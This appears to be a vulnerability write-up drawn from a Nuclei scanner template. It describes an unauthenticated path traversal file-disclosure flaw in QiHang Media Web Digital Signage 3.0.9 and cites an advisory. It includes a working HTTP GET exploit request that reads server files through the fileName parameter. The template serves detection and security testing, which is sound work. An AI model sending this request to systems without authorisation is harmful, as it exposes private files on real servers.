# Nuclei Template: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure
**Template ID:** qihang-media-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`qihang-media-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The QiHang Media Web application suffers from an unauthenticated file disclosure vulnerability when input passed thru the filename parameter when using the download action or thru path parameter when using the getAll action is not properly verified before being used. This can be exploited to disclose contents of files and directories from local resources.

## Steps to reproduce / Exploit Payload
```http
GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
Host: {{Hostname}}
Connection: close
```

## References
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php
